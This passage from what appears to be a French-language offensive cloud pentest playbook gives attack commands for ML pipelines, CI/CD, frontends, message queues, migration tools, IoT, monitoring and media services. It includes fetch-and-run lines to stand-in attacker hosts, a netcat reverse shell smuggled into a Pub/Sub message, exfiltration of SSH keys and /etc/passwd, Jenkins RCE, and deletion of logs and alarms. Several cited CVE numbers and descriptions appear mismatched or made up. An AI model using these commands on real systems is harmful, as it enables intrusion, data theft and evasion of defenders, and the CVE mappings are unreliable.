curl -X POST http://target:8888/api/sessions
```

---

## 🧬 PHASE 4 — INJECTION PIPELINE

### 💉 ML Ops / CI/CD Abuse :

- Poisoning dataset : injection CSV malicieux
- Model file with pickle RCE
- Malicious .pkl + scikit-learn deserialization

```bash
echo 'import os;os.system("curl attacker/pwn.sh|sh")' > evil.pkl
```

- Notebook injection (.ipynb upload → cell exec)

---

## 🦠 PHASE 5 — ESCALADE & PERSISTENCE

- Création d’un modèle persistant en REST API
- Model endpoint avec reverse shell backdoor
- Lambda ou Cloud Function qui héberge l’inférence

```python
import os
def handler(event, context):
    os.system("curl attacker.sh | bash")
```

---

## ⚠️ PHASE 6 — MAPPING CVE / MITRE

### 📌 MITRE ATT&CK :
- T1203 (Exploitation via Jupyter)
- T1565.001 (Data Poisoning)
- T1027 (Obfuscated pickle model)
- T1210 (Remote Service Exploitation via REST)

### 📌 CVEs :
- CVE-2021-28657 (Jupyter Token Bypass)
- CVE-2022-23703 (Pickle deserialization exploit)
- CVE-2023-27585 (SageMaker public access leak)

---

## 🧰 SCRIPTING

```bash
ml_enum.sh → reco endpoints + fuzzing + token dump
ml_poison_pipeline.sh → inject pickle RCE + upload dataset
ml_model_exfil.sh → knockoffnets clone
jupyter_hijack.sh → session takeover + payload upload
```

---

## 🧾 OUTPUTS STRUCTURÉS

```
/output/cloud/ml_ai/enum_endpoints.log
/output/cloud/ml_ai/model_behavior.json
/output/cloud/ml_ai/injection_report.md
/output/cloud/ml_ai/model_clone.h5
/output/cloud/ml_ai/persisted_backdoor.ipynb
```

---

### ☁️ MODULE STRATÉGIQUE : `engine_cloud_devtools()`

**OBJECTIF :**  
Ce module cible les outils de développement cloud (DevTools) exposés ou mal configurés pouvant ouvrir la voie à des fuites de code, secrets d’API, CI/CD injectables, environnement de build compromis, Git exposé, etc.

---

### 🔍 PHASE 1 : RECONNAISSANCE & ENUMÉRATION

#### 🔎 Cibles :
- Repositories GitHub / GitLab auto-hébergés
- URL de CI/CD (Jenkins, GitLab CI, TravisCI)
- AWS CodeBuild / Azure DevOps / GCP Cloud Build
- CLI/API endpoints mal protégés

#### 🔧 Recon :
```bash
# Repos publics exposés
github-dorks.py --dork "filename:.env AWS_SECRET_ACCESS_KEY" --output findings.txt
gitrob orgname

# Détection CI/CD exposée
nmap -p80,443 <target> --script http-jenkins, http-gitlab-ci

# API DevTools accessibles
curl https://ci.target.com/api/v1/builds
```

---

### 🔓 PHASE 2 : VÉRIFICATION DES FAIBLESSES

#### 🔑 Secrets, credentials, clés API :
- .env exposé, variables d’environnement
- AWS_ACCESS_KEY_ID, SSH_PRIV_KEY, Slack/Discord Tokens
- `.git` folders ou S3 Bucket contenant historique

#### 🔍 Analyse :
```bash
# Scan secrets dans CI
trufflehog git@github.com:org/repo.git

# Fuite depuis historique Git
git clone --mirror http://target/.git/
cd repo.git && git log -p | grep -i "password\|secret\|token"
```

---

### 🛠️ PHASE 3 : EXPLOITATION / POST-EXPLOIT

#### 📦 Exploits :
- **Jenkins Script Console RCE**
- **GitLab CVE-2021-22205 / CVE-2023-50001 (RCE via imageMagick, zip slip)**
- **Build poisonning** via `Dockerfile` ou YAML de pipeline

```bash
# Jenkins RCE
curl -X POST http://jenkins.target/script \
--data-urlencode 'script=println "Pwned"; "cmd /c calc".execute()'

# Pipeline injection
echo 'echo malicious > /tmp/pwn' >> .gitlab-ci.yml
git push
```

---

### 🧪 PHASE 4 : ABUS D'INFRASTRUCTURE

- Privilege escalation via pipeline GitLab
- SSH clé auto-ajoutée dans pipeline pour rebond interne
- Substitution d’artifact dans une registry CI/CD

---

### 🧬 MAPPING TECHNIQUE

- MITRE ATT&CK :
  - T1210 (Exploitation d’interface d’administration)
  - T1606.002 (Code injection dans pipeline CI/CD)
  - T1552.001 (Dump credentials)
  - T1071.001 (C2 via HTTP)

- CVE Corrélées :
  - CVE-2021-22205 (GitLab)
  - CVE-2019-1003000 (Jenkins RCE)
  - CVE-2022-29510 (GitHub Actions artifact overwrite)

---

### 🗃️ OUTPUT :

```
/output/cloud/devtools/exposed_git.txt
/output/cloud/devtools/ci_rce_payloads.txt
/output/cloud/devtools/secrets_dump.log
/output/cloud/devtools/artifact_backdoor_injected.md
```

---

### 🧠 SUIVI AUTOMATIQUE (Heuristique adaptative) :

- Si secret API AWS → déclenche `engine_cloud_iam()`
- Si Jenkins exposé + plugin groovy → RCE
- Si repo privé → dump, inject, rebond

---

### 🌐 MODULE : `engine_cloud_frontend()`

**DESCRIPTION GÉNÉRALE**  
Module offensif de reconnaissance, détection de failles et d’exploitation des composants front-end hébergés ou servis depuis une infrastructure cloud (S3 buckets publics, CloudFront, S3 static hosting, Amplify, Firebase Hosting, Vercel, etc.). Il vise également les assets exposés via CDN, SPA, apps React/Vue/Angular, GraphQL, JavaScript obfusqué, APIs Shadow et configurations clientes exposées.

---

## 🧠 TYPE_ABSTRAIT : `FrontendCloudTarget`

```typescript
FrontendCloudTarget {
    domain: string,
    cdn_enabled: boolean,
    frontend_framework: string,
    storage_backend: string,
    exposed_api: boolean,
    uses_graphql: boolean,
    env_keys_exposed: boolean,
    js_sources: string[],
    subresources: string[],
    hosting_provider: enum<AWS | GCP | Firebase | Vercel | Azure | Netlify>,
    misconfigurations: [string]
}
```

---

## 🔍 PHASE 1 : **Reconnaissance avancée Frontend Cloud**

- 🔎 **Recon Cloud Buckets & Hosting**
  ```bash
  python3 S3Scanner.py -b <domain>
  aws s3 ls s3://<bucketname> --no-sign-request
  firebase target:list
  gcp_storage_enum.py -d <domain>
  dig +short CNAME <domain>
  subfinder -d <domain> | httpx -cdn -status
  ```

- 🔎 **Analyse JS & Variables ENV**
  ```bash
  wget <target>/*.js -P js/
  grep -E 'AIza|sk_live|client_secret|firebaseio|access_token' js/*.js
  jsbeautifier js/*.js
  ```

- 🔎 **CDN, Amplify, S3**
  ```bash
  dig <domain> +short
  curl -I https://<target> → check for `x-amz` / `cloudfront`
  amass enum -passive -d <domain>
  ```

---

## 🔓 PHASE 2 : **Exploitation & Injection SPA/JS**

- 🚩 **Exploitation JS/API exposées**
  ```bash
  nuclei -t exposed-tokens/
  secretfinder -i js/*.js -o json
  LinkFinder -i js/*.js
  ```

- 🚩 **XSS/SPA Exploit Testing**
  ```bash
  xsstrike -u https://<target>/search?q=payload
  dalfox url https://<target> --deep-dive
  bXSS payload injection pour test Cloudflare-WAF evasion
  ```

---

## ⚙️ PHASE 3 : **Fingerprinting Frontend Framework**

- 🧠 **Détection Angular/Vue/React**
  ```bash
  wappalyzer -u https://<domain>
  curl -s <target> | grep "window.__NUXT__"  # Vue/Nuxt
  grep -E '__NEXT_DATA__|ReactDOM' index.html
  ```

- ⚠️ **Vulnérabilités Framework**
  - VueJS XSS v2/v3 → payload script tags
  - Angular CSP bypass injection
  - NextJS / Nuxt env expose `.env` sur SSR mal configuré

---

## 🔐 PHASE 4 : **Cloud Misconfig & Public Exposure**

- 🔓 **Analyse des buckets + erreurs HTTP**
  ```bash
  curl https://<target>/robots.txt
  curl https://<target>/.env
  curl https://<target>/config.json
  ```

- 🧪 **Exploitation Cloud-specific**
  - `aws s3 cp s3://bucket/file .` (read test)
  - `cloud_enum.py -k <keyword>`
  - Cloudfront misconfig → takeover domain test

---

## 🎯 PHASE 5 : **Reverse Engineering côté client**

- 🔎 **Analyse JS reverse**
  ```bash
  jsbeautifier js/main.js > main.formatted.js
  grep -Ei '(secret|key|auth|token)' main.formatted.js
  strings main.formatted.js | grep 'api'
  ```

- 📜 **Signature/Token Extraction**
  - JWT hardcoded ou `signingKey` en clair
  - Firebase config leak (API keys utilisables)
  - CORS permissif : test via `curl -H 'Origin: evil.com'`

---

## 🧩 PHASE 6 : **Génération automatisée des scripts**

- `frontend_enum.sh`
- `frontend_secrets.sh`
- `frontend_framework_exploit.sh`
- `frontend_reverse.sh`

---

## 🧬 MAPPINGS MITRE / CVE

| CVE / Vulnérabilité | Description | Mapping MITRE |
|---------------------|-------------|----------------|
| CVE-2022-37434 | Next.js SSR Leaks | T1592 |
| CVE-2021-21224 | NuxtJS Config Disclosure | T1210 |
| CVE-2020-15174 | S3 Public Access ACL | T1530 |
| CVE-2021-3918 | DOM XSS React apps | T1059.007 |
| CVE-2022-21661 | Amplify misconfig Token | T1552.001 |

---

## 📦 OUTPUTS LOGS

```
/output/cloud/<target>/frontend/cloud_enum.json
/output/cloud/<target>/frontend/js_secrets.txt
/output/cloud/<target>/frontend/cdn_fingerprint.log
/output/cloud/<target>/frontend/framework_exploits.log
```

---

### 🔄 MODULE : `engine_cloud_app_integration()`

**DESCRIPTION GÉNÉRALE**  
Ce module analyse et exploite les services d’intégration d’applications cloud (AWS EventBridge, SQS, SNS, Azure Logic Apps, GCP Pub/Sub, Zapier, IFTTT, etc.), incluant **triggering malicieux**, **injection dans les messages**, **replay**, **privilege escalation par trust chaining**, et **leak d’identifiants via logs ou payloads persistants**.

---

## 🧠 TYPE_ABSTRAIT : `AppIntegrationTarget`

```typescript
AppIntegrationTarget {
    queue_services: [string],             // ex: SQS, Azure Queue Storage
    pubsub_services: [string],            // SNS, Pub/Sub, EventGrid
    event_driven_logic: boolean,
    trigger_entrypoints: [string],        // webhooks, HTTP trigger
    credentials_found: boolean,
    response_leakage: boolean,
    observed_policies: [string],          // Trust, IAM, EventRules
    cloud_platform: enum<AWS | Azure | GCP | Other>,
    abused_patterns: [string]             // replay, DoS, impersonation
}
```

---

## 📍 PHASE 1 : **Reconnaissance & Fingerprinting**

- 🔎 **Analyse de queues / topics / events**
```bash
# AWS
aws sqs list-queues
aws sns list-topics
aws events list-rules

# GCP
gcloud pubsub topics list
gcloud functions list --format=json

# Azure
az eventgrid topic list
az logic workflow list
```

- 🔍 **Requête sur endpoints HTTP**
```bash
amass enum -d <domain> | httpx -path /webhook -silent
subfinder | gau | gf webhook
```

- 🔎 **Détection Zapier / IFTTT**
```bash
curl -i https://hooks.zapier.com/hooks/catch/<id>/<trigger>
```

---

## 🛠️ PHASE 2 : **Attaque des systèmes de queue & triggers**

- 🚨 **Replay et DoS logic**
```bash
# Si webhook ou topic listener vulnérable :
for i in {1..1000}; do curl -X POST -d '{"event":"trigger"}' <endpoint>; done

# Replay JSON malformé sur Azure Logic Apps :
curl -X POST -H 'Content-Type: application/json' -d @fuzzed_payload.json https://<logicapp>
```

- 🧬 **Abus de SQS non authentifié / overtrusted**
```bash
aws sqs send-message --queue-url <target> --message-body "pwned" --profile attacker
```

- 📮 **SNS mal configuré (no subscription filter)**
```bash
aws sns publish --topic-arn <arn> --message "injected_alert"
```

- 🔁 **Injection command in GCP Pub/Sub**
```bash
gcloud pubsub topics publish <topic> --message "{\"cmd\":\";nc attacker 4444 -e /bin/bash\"}"
```

---

## ⚙️ PHASE 3 : **Analyse des permissions et triggers**

- 🔐 **IAM Analysis for Event Execution**
```bash
# AWS
aws iam list-roles | grep -i event
aws events list-targets-by-rule --rule <rule-name>

# Azure
az role assignment list --assignee <principal> --all
```

- 🧨 **LFI / RCE via webhook-based flows**
```bash
# POST JSON injection
curl -d '{"username":"{{7*7}}"}' -H "Content-Type: application/json" https://<webhook>
```

---

## 🛡️ PHASE 4 : **Stratégies offensives avancées**

- ⚔️ **Chain Trust & Escalation**
  - EventBridge → triggers Lambda → write logs → steal env
  - Zapier → write to S3 → malicious code injecté
  - Logic App → triggers Functions → overwrite code source

- 🪝 **Fuzzing Webhooks**
```bash
ffuf -u https://target/webhook/FUZZ -w wordlists/common.txt -X POST -d "payload=test"
```

- 📚 **Collecte de logs exposés**
```bash
# AWS CloudWatch log sniffing (si creds trouvés)
aws logs describe-log-groups
aws logs get-log-events --log-group-name <group>
```

---

## 🔥 PHASE 5 : **Génération de scripts d’exploitation**

- `webhook_fuzzer.sh`
- `sqs_attack.sh`
- `sns_spam_trigger.sh`
- `azure_logic_replay.ps1`
- `event_trigger_enum.py`

---

## 📌 MAPPINGS MITRE / CVE

| Identifiant | Description | MITRE ATT&CK |
|-------------|-------------|---------------|
| T1059.007   | Command Injection (Logic App, PubSub) | Execution |
| T1585.002   | Abuse of APIs or webhook for phishing | Initial Access |
| T1609       | Cloud Queue / Topic Abuse | Persistence |
| CVE-2020-8622 | Trust boundary bypass (event routing) | Privilege Escalation |
| CVE-2022-23943 | Logic App replayable triggers | Replay Injection |

---

## 🗃️ OUTPUTS

```
/output/cloud/<target>/app_integration/event_recon.json
/output/cloud/<target>/app_integration/webhook_enum.log
/output/cloud/<target>/app_integration/payload_injection.log
/output/cloud/<target>/app_integration/abused_chain_diagram.dot
```

---

## 🚚 MODULE : `engine_cloud_migration_transfer()`

**DESCRIPTION GÉNÉRALE**  
Ce module cible les services de migration cloud, de réplication de données, de transfert de VM et de synchronisation inter-environnements, comme AWS DMS / Snowball / Application Migration Service, Azure Migrate, GCP Transfer Service, etc. Il identifie les erreurs de configuration, fuites de credentials, canaux de transfert interceptables, API mal protégées, accès exposés et possibilités de pivot.

**Objectif :** intercepter, manipuler ou détourner des flux de migration ou de réplication, et abuser des outils de transfert pour remonter jusqu'à des ressources critiques.

---

## 🧠 TYPE_ABSTRAIT : `CloudMigrationSurface`

```typescript
CloudMigrationSurface {
    cloud_provider: enum<AWS | Azure | GCP | Other>,
    transfer_services: [string],              // Snowball, DMS, Azure Migrate
    discovered_agents: [string],              // VM agents, transfer-daemons
    exposed_api: boolean,
    insecure_protocols: boolean,
    signed_urls_detected: boolean,
    compromised_keys: [string],
    transfer_logs_found: boolean,
    rsync_rdp_smb_present: boolean,
    migration_bridge_found: boolean,
    privilege_escalation_path: [string]
}
```

---

## 🔍 PHASE 1 : RECONNAISSANCE – DÉTECTION DES SERVICES DE MIGRATION

- **API Recon**
```bash
# AWS Migration Hub / DMS
aws discovery describe-agents
aws dms describe-replication-tasks

# Azure Migrate
az migration project list
az resource list | grep migrate

# GCP Transfer
gcloud transfer jobs list
gcloud transfer agents list
```

- **Network Recon**
```bash
nmap -p 873,445,22,5985,3389,5000 <target>
whatweb http://<target> | grep migration
```

- **Agent Analysis**
```bash
# Agent reconnaissance sur Windows/Linux
ps aux | grep -i 'migrate\|snowball\|transfer'
strings /opt/migrate/agent.log | grep http
```

---

## ⚠️ PHASE 2 : EXPLOIT DES FAIBLESSES DE TRANSFERT

- **Interception de Données (Man-In-The-Migration)**
```bash
# TCPDump sur réseau dédié de migration
tcpdump -i eth1 port 873 or port 5000

# Wireshark filter pour Snowball ou AzureBlob
(ip.addr == <target>) && (http.request.uri contains "migration")
```

- **Credential Leak dans logs ou URLs**
```bash
# Scan de logs S3 ou blob avec bucket enumeration
aws s3 ls s3://migration-logs/
aws s3 cp s3://migration-logs/leak.log .

# Signed URL enumeration
gau targetdomain.com | grep "sig=" | gf s3signedurls
```

- **Replay & Abuse**
```bash
# Replay Azure blob or GCP Transfer signed URL
curl -O 'https://blob.core.windows.net/...&sig=abc'

# Dump SFTP credentials used by agent (if config readable)
cat /etc/migration_agent.conf | grep password
```

---

## 🚨 PHASE 3 : ESCALADE & PIVOT PAR LES OUTILS DE MIGRATION

- **Pivot via agent**
```bash
# SSH agent exploit
ssh <agent> 'cat /etc/shadow'

# Abuse AWS Application Migration Service
aws mgn describe-replication-servers
aws mgn start-replication-task
```

- **Privilege Escalation**
```bash
# LPE si agent installé en root / SYSTEM
exploit/windows/local/azure_migrate_agent_privesc
exploit/linux/local/aws_dms_sync_privesc
```

---

## 💣 PHASE 4 : ABUS DE SERVICES TRANSFERT

- **Snowball + External Device**
```bash
# Snowball device analysis
nmap -O -sV <snowball-ip>
curl http://<snowball-ip>:8080/config.js

# USB-mounted intercept
lsusb; mount /dev/sdX /mnt/snowball
```

- **CloudSync Overwrites**
```bash
aws s3 sync --delete malicious_folder/ s3://target-bucket/
rclone sync ./loot remote:targetbucket --config ~/.rclone.conf
```

- **Migration tunnels (Rsnapshot / Rsync / Rsyslog)**
```bash
# abuse rsync path traversal
rsync -avz ../../../../root/.ssh/id_rsa attacker@host:~
```

---

## 🧠 PHASE 5 : MAPPING HEURISTIQUE

| Identifiant         | Description                                  | MITRE ATT&CK              |
|---------------------|----------------------------------------------|----------------------------|
| T1020               | Automated Transfer Tool Abuse                | Exfiltration               |
| T1573               | Encrypted Channel Interception / Reuse      | Exfiltration               |
| T1203               | Exploitation of Signed URLs / APIs          | Initial Access             |
| T1078.004           | Abuse of Cloud Migration Credentials        | Persistence / Access       |
| CVE-2023-3172       | Azure Agent Auth Bypass                     | Escalation                 |
| CVE-2022-41043      | Snowball device config leak                 | Exposure / Configuration   |

---

## 🛠️ OUTILS & SCRIPTS

- `migration_agent_recon.sh`
- `signedurl_replay.py`
- `cloudsync_overwrite.sh`
- `pivot_from_migration.ps1`
- `snowball_enum.sh`

---

## 🧾 OUTPUT STRUCTURÉ

```
/output/cloud/<target>/migration/agent_inventory.json
/output/cloud/<target>/migration/leaked_signedurls.txt
/output/cloud/<target>/migration/pivot_access.log
/output/cloud/<target>/migration/sync_loot_map.md
```

---

## 🌐 `engine_cloud_iot()`

### 🎯 OBJECTIF :
Automatiser un pentest complet sur les environnements **IoT dans le Cloud** (AWS IoT Core, Azure IoT Hub, Google Cloud IoT Core, etc.), avec reconnaissance, abus de services MQTT/CoAP/HTTP, failles de provisioning, shadow device injection, et exfiltration via les liens edge↔cloud.

---

## 📦 TYPE_ABSTRAIT : `CloudIoTTarget`

```plaintext
CloudIoTTarget {
    provider: AWS | Azure | GCP,
    iot_services: [string],
    endpoints: [string],
    auth_type: Token | Cert | IAM,
    mqtt_topics: [string],
    coap_endpoints: [string],
    device_shadow: boolean,
    tls_config: TLSProfile,
    api_exposure: boolean,
    firmware: boolean,
    device_ids: [string],
    cert_paths: [string],
    creds_leaked: boolean,
    raw_signals: [Signal]
}
```

---

## 🔍 PHASE 1 – Reconnaissance Cloud + MQTT/CoAP

- 📡 **Scan des brokers MQTT/COAP exposés**
  ```bash
  mosquitto_sub -h <broker> -t '#' -v
  coap-client -m get coap://<ip>/<path>
  ```
- 🔑 **Recherche d’API exposée ou d’auth faible**
  ```bash
  nuclei -u https://iot-api.example.com -t iot-weak-auth.yaml
  ```
- 📜 **Détection de topic MQTT Shadow Update**
  ```bash
  mosquitto_sub -t '$aws/things/+/shadow/update'
  ```

---

## 🚨 PHASE 2 – Abus des flux MQTT/CoAP

- **Replay de topic pour injection de commande**
  ```bash
  mosquitto_pub -h <broker> -t '$aws/things/<device>/shadow/update' \
  -m '{"state":{"desired":{"reboot":true}}}'
  ```

- **IoT topic sniffing avec wireshark + dissector**
  ```bash
  tshark -Y mqtt -i wlan0
  ```

- **Payload injection dans les Device Shadow**
  ```bash
  curl -X POST https://iot.<region>.amazonaws.com/things/<thing-name>/shadow \
  -d '{"state":{"desired":{"firmwareUpdate":"http://attacker/payload"}}}'
  ```

---

## 🔓 PHASE 3 – Exploitation de certificats / tokens

- **Extraction de cert.pem / private.key via erreurs**
  ```bash
  aws iot describe-endpoint --output json | jq .
  curl -k https://iot.example.com/cert.pem
  ```

- **Re-signature de JWT / Device Token abuse**
  ```bash
  jwt_tool token.jwt -S -I -C -T
  ```

- **Client cert auth abuse → Impersonation**
  ```bash
  openssl s_client -connect iot-broker:8883 -cert device.pem -key device.key
  ```

---

## 🔁 PHASE 4 – Escalade Edge ↔ Cloud

- **Pivot : Device → Cloud admin**
  - Shadow overwrite
  - Device twin desync + DoS
  - IAM binding overwrite (AWS CLI)
  
  ```bash
  aws iot attach-policy --policy-name "AdministratorAccess" \
  --target arn:aws:iot:<region>:<account>:thing/<device>
  ```

---

## 📦 PHASE 5 – Mapping CVE ↔ Exploit

| CVE-ID          | Description                                | Impact        |
|------------------|--------------------------------------------|---------------|
| CVE-2020-25211   | AWS IoT MQTT Auth bypass                  | High          |
| CVE-2022-29969   | GCP IoT Device misbinding                 | Critical      |
| CVE-2021-22945   | Azure IoT Hub DoS                         | Medium        |

---

## 🔐 PHASE 6 – Persistance et Reconnexion

- **Reverse payload dans firmware OTA**
  ```bash
  inject-firmware.py --target iot-device.bin --cmd "wget http://attacker/shell.sh"
  ```
- **Scheduled topic injection**
  ```bash
  mosquitto_pub -t '$aws/things/<thing>/shadow/update/delta' -m '{"state":{"reboot_time":"03:00"}}'
  ```

---

## 🔁 SCRIPTING AUTOMATIQUE

```bash
# Recon MQTT/COAP
scan_iot_mqtt.sh → auto-subscribe & log
scan_iot_coap.sh → discover endpoints

# Abus Device Shadow
iot_shadow_attack.sh → inject JSON malicious payload

# Certs Abuse
iot_cert_abuse.sh → openssl connect + test commands

# Cloud CLI escalation
iot_cloud_escalate.sh → AWS/Azure CLI privilege abuse

# Exfiltration
iot_exfil.sh → Rclone or curl HTTPS
```

---

## 📤 OUTPUTS

```plaintext
/output/cloud/iot/recon/mqtt_topics.log
/output/cloud/iot/shadow/payloads_injected.txt
/output/cloud/iot/certs_abused.log
/output/cloud/iot/escalation/cloudadmin_takeover.flag
```

---

## 📊 `engine_cloud_monitoring()`

### 🎯 OBJECTIF :
Auditer, contourner ou exploiter les services de **monitoring cloud**, souvent négligés et pourtant critiques pour :
- L’analyse comportementale
- La sécurité (alertes, logs, forensic)
- L’exfiltration furtive ou le masquage d’activité

---

## 📦 TYPE_ABSTRAIT : `CloudMonitoringSurface`

```plaintext
CloudMonitoringSurface {
    provider: AWS | Azure | GCP,
    logs_exposed: boolean,
    log_groups: [string],
    metrics_custom: boolean,
    trace_services: [string],
    alarm_config: [string],
    alerts_disabled: boolean,
    data_retention: int,
    api_logging: boolean,
    flow_logs: boolean,
    audit_logs: boolean,
    logging_bucket: string,
    raw_signals: [Signal]
}
```

---

## 🔍 PHASE 1 – Reconnaissance des services de logging actifs

- **AWS : CloudTrail, CloudWatch, GuardDuty**
  ```bash
  aws cloudtrail describe-trails
  aws logs describe-log-groups
  aws guardduty list-detectors
  ```

- **Azure : Monitor, Diagnostic Settings, Sentinel**
  ```bash
  az monitor diagnostic-settings list
  az monitor log-profiles list
  az sentinel alert-rule list
  ```

- **GCP : Logging, Monitoring, Audit**
  ```bash
  gcloud logging sinks list
  gcloud logging logs list
  gcloud beta monitoring policies list
  ```

---

## 🚨 PHASE 2 – Bypass / Contournement / Suppression de logs

- **Désactivation temporaire ou permanente des loggers**
  ```bash
  aws logs delete-log-group --log-group-name <group>
  gcloud logging sinks delete <sink-name>
  ```

- **Modification du niveau de log (info → error)**
  ```bash
  az monitor diagnostic-settings update --log-analytics-workspace <id> --logs '[{"category":"Security","enabled":false}]'
  ```

- **Exploitation bucket de logs mal protégé (S3 / GCS)**
  ```bash
  aws s3 ls s3://cloudtrail-logs-xxxx --no-sign-request
  gsutil ls gs://gcp-logs-bucket
  ```

---

## 🕵️ PHASE 3 – Analyse des alarmes / alertes

- **Injection d’alarmes falsifiées (DoS, leurre)**
  ```bash
  aws cloudwatch put-metric-data --namespace "FakeService" --metric-name "CPUUtilization" --value 9000
  ```

- **Neutralisation des alarmes critiques**
  ```bash
  aws cloudwatch delete-alarms --alarm-names "HighCPUAlarm"
  az monitor metric-alert delete --name "prod-overload" --resource-group "rg-prod"
  ```

---

## 🔓 PHASE 4 – Attaques sur API et métriques

- **Overuse abusive des métriques personnalisées (flood logs)**
  ```bash
  aws cloudwatch put-metric-data --namespace 'PentestFlood' --metric-name 'Spam' --value 1 --timestamp <now>
  ```

- **CloudTrail API abuse → extract IAM activity**
  ```bash
  aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole
  ```

---

## 💣 PHASE 5 – Exploitation et exfiltration furtive

- **Exfiltration dans métriques personnalisées**
  ```bash
  aws cloudwatch put-metric-data --namespace "exfil" --metric-name "payload" --value 31337
  ```

- **Tunnel via log collector (PoC S3 webhook + filebeat)**
  ```bash
  echo "$(cat /etc/passwd)" | aws logs put-log-events ...
  ```

---

## 🧠 PHASE 6 – Mapping CVE ↔ MITRE ↔ CPE

| CVE-ID          | Description                              | TTP              |
|------------------|------------------------------------------|------------------|
| CVE-2021-43976   | Azure Log4Shell Alert suppression        | Defense Evasion  |
| CVE-2022-32911   | AWS CloudWatch metrics abuse             | Collection       |
| CVE-2023-26745   | GCP Logs exfiltration path               | Exfiltration     |

---

## 🔁 SCRIPTING PENTEST

```bash
# Reco
cloudmon_enum.sh → scan des logs, metrics, alertes

# Abuse
cloudmon_flood.sh → spam metrics & logs

# Bypass
cloudmon_disabler.sh → mute alarms & delete sink

# Exfil
cloudmon_exfil.sh → injection base64 + log forwarding
```

---

## 📤 OUTPUTS

```plaintext
/output/cloud/monitoring/active_logs.json
/output/cloud/monitoring/logs_exfil.log
/output/cloud/monitoring/alarms_disabled.flag
/output/cloud/monitoring/metrics_abuse_stats.csv
```

---

## 📺 `engine_cloud_media()`

### 🎯 OBJECTIF :
Déclencher une stratégie offensive sur les services cloud **de diffusion, traitement ou stockage média**, en :
- Auditant les permissions et politiques liées aux flux multimédias (IAM, URLs privées, DRM)
- Détectant les endpoints non protégés (CDN, VOD)
- Interceptant, manipulant, exfiltrant ou injectant dans les flux
- Exploitant les erreurs de configuration, vulnérabilités de diffusion ou chaines de transcodage

---

## 📦 TYPE_ABSTRAIT : `CloudMediaTarget`

```plaintext
CloudMediaTarget {
    provider: AWS | Azure | GCP,
    services: [string],
    endpoints: [string],
    protocols: [HLS, DASH, RTMP, WebRTC],
    cdn_integrated: boolean,
    drm_enabled: boolean,
    input_bucket: string,
    media_acl_public: boolean,
    ivs_channels: [string],
    subtitles_path: [string],
    manifest_exposed: boolean,
    custom_transcoding: boolean,
    ai_caption: boolean,
    raw_signals: [Signal]
}
```

---

## 🔍 PHASE 1 – Reco des médias et endpoints vulnérables

- **Scan des flux HLS/DASH/RTMP/WebRTC**
  ```bash
  ffprobe https://<media-url>/playlist.m3u8
  curl -I https://<cdn-url>/stream/manifest.mpd
  ```

- **Scan de MediaStore S3 public**
  ```bash
  aws s3 ls s3://mediastore-vod-public --no-sign-request
  ```

- **Enum IVS / LiveStream exposés**
  ```bash
  aws ivs list-channels
  curl https://ivs.live.<region>.amazonaws.com/stream/<id>
  ```

- **Detection de manifestes non chiffrés**
  ```bash
  nuclei -u https://target/stream.m3u8 -t cdn-leak.yaml
  ```

---

## 🕵️ PHASE 2 – Analyse des chaînes de diffusion et transcodage

- **Analyse DRM / clefs de stream**
  ```bash
  download m3u8 manifest → check EXT-X-KEY + encryption
  ```

- **Bypass des clés DRM mal implémentées**
  ```bash
  widevine-dump + shaka packager bypass PSSH
  ```

- **Détection de transcoders custom vulnérables**
  ```bash
  nikto -h https://<transcoder-host>
  ```

---

## 🔓 PHASE 3 – Abus de services + détournement de flux

- **Injection sous-titres + deepfake overlay**
  ```bash
  curl -X PUT -d 'evil.vtt' https://<target>/subs/stream.vtt
  ffmpeg overlay -i base_stream.mp4 -vf "drawtext=evil message"
  ```

- **Reverse Shell dans la pipeline de transcodage**
  ```bash
  video.mp4 + embedded command → transcoding triggers execution
  ```

- **Exploitation Azure AMS / Live Event**
  ```bash
  az ams asset list
  az ams live-event stop --name teststream
  ```

---

## 🔁 PHASE 4 – Interception + MITM / CDN poisoning

- **Interception via CloudFront HTTP headers**
  ```bash
  curl -I https://d1234.cloudfront.net/video.m3u8 -H "X-Forwarded-Host: attacker.com"
  ```

- **Poisoning edge-node**
  ```bash
  echo 'payload' | curl --header "Host: edge.target.com" http://cdn-edge.example.com
  ```

- **WebRTC Jitter Buffer Injection**
  ```bash
  mitmproxy --mode transparent --script inject-webrtc-payload.py
  ```

---

## 💣 PHASE 5 – Exploits / CVE & MITRE Mapping

| CVE-ID          | Description                                  | Exploit TTP              |
|------------------|----------------------------------------------|---------------------------|
| CVE-2023-21722   | Azure Media Services - Upload RCE            | Initial Access            |
| CVE-2022-22962   | AWS IVS exposure via misconfigured identity  | Discovery + Lateral Move |
| CVE-2021-43551   | GCP Video AI Exfil + Caption Injection       | Exfiltration              |

---

## 🔁 SCRIPTING AUTOMATIQUE

```bash
media_reco.sh          → Enum CDN, DRM, streams
media_drm_bypass.sh    → PSSH / Widevine test
media_stream_inject.sh → Subtitles & overlays
media_poison_cdn.sh    → Forge origin headers
media_ffmpeg_payload.sh → Transcoder RCE chain
```

---

## 📤 OUTPUTS

```plaintext
/output/cloud/media/reco/manifest_log.txt
/output/cloud/media/exploit/drm_bypass.flag
/output/cloud/media/poisoning/cdn_reflect.log
/output/cloud/media/injection/stream_overlay_report.md
/output/cloud/media/exfil/stream_leak.flag
```

---

## 🧠 `engine_cloud_mgmt_governance()`

### 🎯 OBJECTIF :
- Identifier, détourner ou abuser des systèmes de **monitoring/audit**
- Détourner la **chaîne de confiance et de compliance**
- Dénicher les **failles de gestion centralisée de comptes / policies**
- Abuser les mécanismes de **logs, quotas, rôles transverses**

---

## 🧩 TYPE_ABSTRAIT : `CloudGovernanceTarget`

```plaintext
CloudGovernanceTarget {
    provider: AWS | Azure | GCP,
    org_structure: boolean,
    cloudtrail_enabled: boolean,
    config_rules_active: boolean,
    policy_set: boolean,
    audit_logs_exposed: boolean,
    misconfigured_policies: [string],
    cross_account_links: [string],
    identity_zones: [string],
    raw_signals: [Signal],
    governance_bypass_detected: boolean
}
```

---

## 🔍 PHASE 1 – RECO / ENUMÉRATION GOUVERNANCE

- **Lister tous les services de contrôle actif**
  ```bash
  aws config describe-config-rules
  aws organizations list-accounts
  az policy definition list
  gcloud asset search-all-resources
  ```

- **Identifier les éléments manquants ou désactivés**
  ```bash
  aws cloudtrail describe-trails
  aws config describe-delivery-channels
  gcloud logging sinks list
  ```

- **Vérifier les expositions de log bucket ou audit sinks**
  ```bash
  aws s3 ls s3://cloudtrail-logs/ --no-sign-request
  gcloud storage ls gs://audit-logs-bucket
  ```

---

## 🕵️ PHASE 2 – ANALYSE POLICIES, CONSTRAINTS, EXCEPTIONS

